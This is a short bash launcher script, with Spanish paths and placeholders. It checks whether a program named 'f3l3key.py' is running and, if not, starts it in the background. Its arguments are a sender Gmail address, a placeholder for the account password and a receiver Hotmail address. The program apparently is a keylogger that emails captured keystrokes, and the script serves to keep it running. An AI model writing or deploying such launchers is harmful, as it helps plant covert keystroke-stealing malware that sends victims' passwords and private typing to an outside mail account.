#!/bin/bash

if pgrep -f f3l3key.py > /dev/null; then
    :
else
    python3 /home/user/Descargas/f3l3key/f3l3key.py emisor@gmail.com pega_la_clave_aqui receptor@hotmail.com &
fi

